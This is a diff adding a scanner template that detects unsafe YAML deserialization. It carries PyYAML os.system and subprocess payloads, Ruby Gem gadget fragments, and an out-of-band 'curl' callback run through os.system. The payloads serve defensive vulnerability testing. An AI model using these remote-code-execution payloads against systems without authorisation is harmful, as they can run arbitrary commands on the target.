@@ -1,0 +1,25 @@
+id: yaml-unsafe
+info:
+  name: "Unsafe YAML Deserialization"
+  severity: high
+  description: "Detects unsafe YAML loading that allows arbitrary object instantiation"
+  tags: [deserialization, yaml, python, ruby, rce]
+  author: Wired
+
+inject: body
+detection: pattern
+
+payloads:
+  # PyYAML
+  - "!!python/object/apply:os.system ['echo akemi_yaml_rce']"
+  - "!!python/object/apply:subprocess.check_output [['echo','akemi_yaml_rce']]"
+  # Ruby YAML
+  - "--- !ruby/object:Gem::Installer\ni: x"
+  - "--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::DependencyList\n  specs:\n    - !ruby/object:Gem::Source"
+
+matchers:
+  body_patterns:
+    - "akemi_yaml_rce"
+
+oob_payloads:
+  - "!!python/object/apply:os.system ['curl {{OOB_URL}}']"
